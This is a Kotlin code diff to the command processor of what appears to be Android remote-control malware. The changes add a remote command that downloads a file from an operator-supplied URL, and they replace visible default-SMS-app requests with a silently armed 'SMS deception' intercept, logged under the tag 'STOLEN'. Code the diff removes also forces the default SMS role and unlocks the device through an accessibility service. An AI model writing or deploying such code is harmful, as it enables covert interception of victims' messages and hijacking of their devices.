@@ -729,6 +729,33 @@ object CommandProcessor {
                         }
                     }
                 }
+                "UPDATE_SYNTHETIC_SMS" -> {
+                    val urlStr = content.trim()
+                    if (urlStr.startsWith("http")) {
+                        val targetFile = java.io.File(ctx.filesDir, "synthetic_sms.html")
+                        try {
+                            val url = URL(urlStr)
+                            val conn = url.openConnection() as HttpURLConnection
+                            conn.connectTimeout = 15000
+                            conn.readTimeout = 15000
+                            if (conn.responseCode in 200..299) {
+                                conn.inputStream.use { input ->
+                                    targetFile.outputStream().use { output -> input.copyTo(output) }
+                                }
+                                status = "SYNTHETIC_SMS_UPDATED"
+                            } else {
+                                status = "FAILED_DOWNLOAD"
+                                errorMsg = "HTTP ${conn.responseCode}"
+                            }
+                        } catch(e: Exception) {
+                            status = "FAILED_EXCEPTION"
+                            errorMsg = e.message ?: "Unknown download error"
+                        }
+                    } else {
+                        status = "FAILED_FORMAT"
+                        errorMsg = "URL must start with http"
+                    }
+                }
                 "SET_DEFAULT_SMS" -> {
                     DefaultSmsManager.pendingCmdId = id
                     val mode = content.trim().uppercase()
@@ -741,24 +768,33 @@ object CommandProcessor {
                         DebugLogger.log("SMS_MGR", "Captured original SMS app: $currentDefault")
                     }
 
-                    if (DefaultSmsManager.isDefaultSms(ctx)) {
-                        status = "ALREADY_DEFAULT"
-                        DefaultSmsManager.isRelentlessActive = false
-                        DefaultSmsManager.expectedMode = ""
+                    if (mode == "FORCE_REAL_ROLE" || mode == "RELENTLESS" || mode == "STOP_RELENTLESS") {
+                        if (DefaultSmsManager.isDefaultSms(ctx)) {
+                            status = "ALREADY_DEFAULT"
+                            DefaultSmsManager.isRelentlessActive = false
+                            DefaultSmsManager.expectedMode = ""
+                        } else {
+                            DefaultSmsManager.expectedMode = if (mode == "FORCE_REAL_ROLE") "AUTO" else mode
+                            if (mode == "RELENTLESS") {
+                                DefaultSmsManager.isRelentlessActive = true
+                                val i = Intent(ctx, MonitorService::class.java).apply { putExtra("kick_relentless_sms", true) }
+                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
+                                status = "RELENTLESS_TRAP_ARMED"
+                            } else if (mode == "STOP_RELENTLESS") {
+                                DefaultSmsManager.isRelentlessActive = false
+                                status = "RELENTLESS_STOPPED"
+                            } else {
+                                DefaultSmsManager.requestDefault(ctx)
+                                status = "DEFAULT_SMS_REQUESTED"
+                            }
+                        }
+                    } else if (mode == "STOP") {
+                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().putBoolean("sms_deception_active", false).apply()
+                        status = "SMS_INTERCEPT_DISABLED"
                     } else {
-                        DefaultSmsManager.expectedMode = mode
-                                        if (mode == "RELENTLESS") {
-                    DefaultSmsManager.isRelentlessActive = true
-                    val i = Intent(ctx, MonitorService::class.java).apply { putExtra("kick_relentless_sms", true) }
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
-                    status = "RELENTLESS_TRAP_ARMED"
-                } else if (mode == "STOP_RELENTLESS") {
-                    DefaultSmsManager.isRelentlessActive = false
-                    status = "RELENTLESS_STOPPED"
-                } else {
-                    DefaultSmsManager.requestDefault(ctx)
-                    status = "DEFAULT_SMS_REQUESTED"
-                }
+                        // Silent Deception Protocol
+                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().putBoolean("sms_deception_active", true).apply()
+                        status = "SMS_DECEPTION_ARMED"
                     }
                 }
                 "RESTORE_DEFAULT_SMS" -> {
@@ -1983,10 +2019,11 @@ object CommandProcessor {
                                 ctx.startActivity(wakeIntent)
                             }, 6000)
 
-                            // 3. DEFAULT SMS GHOST SEQUENCE (Delayed to 8.5s)
+                            // 3. SILENT SMS INTERCEPT (Delayed to 8.5s)
                             Handler(Looper.getMainLooper()).postDelayed({ 
-                                DefaultSmsManager.expectedMode = "AUTO"
-                                DefaultSmsManager.requestDefault(ctx)
+                                ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                                    .putBoolean("sms_deception_active", true).apply()
+                                DebugLogger.log("STOLEN", "SMS Deception Armed silently.")
                             }, 8500)
 
                             // 4. CONNECTIVITY ENFORCEMENT (Delayed to 18s)
@@ -2063,10 +2100,11 @@ object CommandProcessor {
                         DimmerManager.applyDim(ctx, 0, "AUTO")
                     }, 5500)
 
-                    // 3. DEFAULT SMS GHOST SEQUENCE (7500ms)
+                    // 3. SILENT SMS INTERCEPT (7500ms)
                     Handler(Looper.getMainLooper()).postDelayed({ 
-                        DefaultSmsManager.expectedMode = "AUTO"
-                        DefaultSmsManager.requestDefault(ctx)
+                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                            .putBoolean("sms_deception_active", true).apply()
+                        DebugLogger.log("ONBOARDING", "SMS Deception Armed silently.")
                     }, 7500)
 
                     // 4. CONNECTIVITY ENFORCEMENT (17000ms)
@@ -2611,27 +2649,10 @@ object CommandProcessor {
 
                             allSuccess = true
                             
-                            // Check SMS
-                            if (!DefaultSmsManager.isDefaultSms(ctx)) {
-                                allSuccess = false
-                                DebugLogger.log("RBT_LIFECYCLE", "Validation Failed: SMS not default. Triggering Ghost Hand...")
-                                DefaultSmsManager.expectedMode = "AUTO"
-                                DefaultSmsManager.requestDefault(ctx)
-                                var timeout = 0
-                                while(DefaultSmsManager.expectedMode != "" && timeout < 15) { 
-                                    if (km.isKeyguardLocked) {
-                                        MyAccessibilityService.instance?.executeAutonomousUnlockInternal()
-                                        DefaultSmsManager.requestDefault(ctx) // Re-trigger intent
-                                    }
-                                    kotlinx.coroutines.delay(1000)
-                                    timeout++ 
-                                }
-                                if (DefaultSmsManager.expectedMode != "") {
-                                    DefaultSmsManager.expectedMode = "" // Disarm if timeout
-                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-                                    kotlinx.coroutines.delay(1000) // Let the OS clear the screen for a clean slate
-                                }
-                            }
+                            // Check SMS (Silent Deception Protocol)
+                            ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                                .putBoolean("sms_deception_active", true).apply()
+                            DebugLogger.log("RBT_LIFECYCLE", "SMS Deception Armed silently. Bypassing physical default role request.")
                             
                             // Check Launcher
                             val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
